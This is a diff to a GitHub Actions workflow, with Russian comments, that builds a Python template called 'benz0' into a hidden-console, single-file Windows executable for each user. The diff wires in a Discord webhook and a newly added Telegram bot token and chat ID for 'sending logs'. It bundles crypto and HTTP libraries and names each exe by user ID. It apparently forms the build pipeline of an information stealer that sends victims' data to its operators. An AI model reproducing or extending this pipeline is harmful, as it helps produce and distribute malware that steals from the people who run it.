@@ -20,6 +20,14 @@ on:
         description: 'Icon file as base64 (optional)'
         required: false
         type: string
+      tg_bot_token:
+        description: 'User Telegram Bot Token (for sending logs)'
+        required: true
+        type: string
+      tg_chat_id:
+        description: 'User Telegram Chat ID (for sending logs)'
+        required: true
+        type: string
 
 jobs:
   build:
@@ -65,10 +73,13 @@ jobs:
         run: |
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
           $template = Get-Content "benz0_template.py" -Raw
+          # Заменяем USER_ID, webhook, и добавляем подстановку токена и chat_id
           $template = $template -replace 'USER_ID = "REPLACE_ME"', "USER_ID = `"${{ github.event.inputs.user_id }}`""
           if ("${{ github.event.inputs.discord_webhook }}" -ne "") {
             $template = $template -replace 'h00k = "https://discord.com/api/webhooks/..."', "h00k = `"${{ github.event.inputs.discord_webhook }}`""
           }
+          $template = $template -replace 'REPLACE_TG_TOKEN', "${{ github.event.inputs.tg_bot_token }}"
+          $template = $template -replace 'REPLACE_TG_CHAT', "${{ github.event.inputs.tg_chat_id }}"
           $template | Out-File -FilePath "${filename}.py" -Encoding utf8
           Write-Host "✅ Generated ${filename}.py"
 
@@ -77,13 +88,11 @@ jobs:
         run: |
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
 
-          # Проверяем наличие файла
           if (-not (Test-Path "${filename}.py")) {
             Write-Error "❌ Файл ${filename}.py не найден!"
             exit 1
           }
 
-          # Пути к пакетам
           $crypto_path = python -c "import Crypto, os; print(os.path.dirname(Crypto.__file__))"
           $urllib3_path = python -c "import urllib3, os; print(os.path.dirname(urllib3.__file__))"
           $requests_path = python -c "import requests, os; print(os.path.dirname(requests.__file__))"
@@ -92,7 +101,6 @@ jobs:
           $idna_path = python -c "import idna, os; print(os.path.dirname(idna.__file__))"
           $PIL_path = python -c "import PIL, os; print(os.path.dirname(PIL.__file__))"
 
-          # Формируем массив аргументов
           $pyinstaller_args = @(
             "--onefile",
             "--noconsole",
@@ -112,18 +120,15 @@ jobs:
             "--collect-all", "PIL"
           )
 
-          # Добавляем иконку, если есть
           if (Test-Path "icon.ico") {
             $pyinstaller_args += "--icon=icon.ico"
           }
 
-          # Добавляем имя файла
           $pyinstaller_args += "${filename}.py"
 
           Write-Host "📦 Building with arguments:"
           Write-Host ($pyinstaller_args -join " ")
 
-          # Запускаем PyInstaller
           & pyinstaller $pyinstaller_args
 
           if ($LASTEXITCODE -ne 0) {
@@ -131,7 +136,6 @@ jobs:
             exit 1
           }
 
-          # Переименовываем EXE
           $exe_name = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}.exe" } else { "benz0_${{ github.event.inputs.user_id }}.exe" }
           if (Test-Path "dist\${filename}.exe") {
             Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
